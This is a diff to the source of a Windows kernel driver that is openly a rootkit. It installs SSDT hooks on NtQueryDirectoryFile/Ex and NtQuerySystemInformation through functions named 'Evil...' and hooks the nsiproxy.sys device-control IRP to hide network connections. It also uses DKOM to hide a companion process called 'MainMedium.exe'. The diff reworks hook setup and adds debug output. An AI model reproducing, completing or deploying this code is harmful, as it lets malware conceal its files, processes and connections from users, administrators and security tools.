@@ -6,11 +6,10 @@
 
 
 BOOL HookRelease() {
+    // roothook::InfinityWrap::ReleaseInfinityHooks();
     roothook::SSDT::SystemServiceDTUnhook(NTQUERY_TAG);
     roothook::SSDT::SystemServiceDTUnhook(NTQUERYEX_TAG);
-    if (!IS_DKOM) {
-        roothook::SSDT::SystemServiceDTUnhook(NTQUERYSYSINFO_TAG);
-    }
+    roothook::SSDT::SystemServiceDTUnhook(NTQUERYSYSINFO_TAG);
     irphooking::ReleaseIrpHook(NSIPROXY_TAG, IRP_MJ_DEVICE_CONTROL);
     process::DKUnhideProcess(REMOVE_BY_INDEX_PID, 0);
     return TRUE;
@@ -24,44 +23,35 @@ extern "C" NTSTATUS DriverEntry(_In_ DRIVER_OBJECT * DriverObject, _In_ PUNICODE
 
 
     // Hook NtQueryDirectoryFile/Ex and NtQuerySystemInformation (BETA) if IS_DKOM = 0 (FALSE):
-    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFile, NTQUERY_TAG))) {
-        HookRelease();
-        return STATUS_UNSUCCESSFUL;
-    }
-    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFileEx, NTQUERYEX_TAG))) {
-        HookRelease();
-        return STATUS_UNSUCCESSFUL;
-    }
-    if (!IS_DKOM && !NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQuerySystemInformation, NTQUERYSYSINFO_TAG))) {
+    if (!NT_SUCCESS(roothook::SSDT::InitializeSSDTHook())) {
         HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
 
 
     // IRP hook IRP_MJ_DEVICE_CONTROL of nsiproxy.sys to hide open connections:
-    if (!NT_SUCCESS(irphooking::port_list::InitializePortList())) {
+    if (!NT_SUCCESS(irphooking::address_list::InitializeAddressList())) {
         HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
-    //if (!NT_SUCCESS(irphooking::port_list::AddToPortList(DEFAULT_MEDIUM_PORT))) {
-    //    HookRelease();
-    //    return STATUS_UNSUCCESSFUL;
-    //}
     if (!NT_SUCCESS(irphooking::InitializeIrpHook(NSIPROXY_TAG, IRP_MJ_DEVICE_CONTROL, &irphooking::EvilMajorDeviceControlNsiProxy))) {
         HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
 
-
+    
     // Get PID of medium and delete it from list by default:
+    DbgPrintEx(0, 0, "KMDFdriver - trying to resolve medium PID\n");
     if (!NT_SUCCESS(general_helpers::GetPidNameFromListADD(&MediumPID, "MainMedium.exe", TRUE)) || MediumPID == 0) {
         HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
+    DbgPrintEx(0, 0, "KMDFdriver - Medium PID = %llu\n", MediumPID);
     if (!NT_SUCCESS(process::DKHideProcess(MediumPID, TRUE))) {
         HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
+    DbgPrintEx(0, 0, "KMDFdriver - Medium process %llu was hidden successfully\n", MediumPID);
 
 
     const char* HelloMessage =
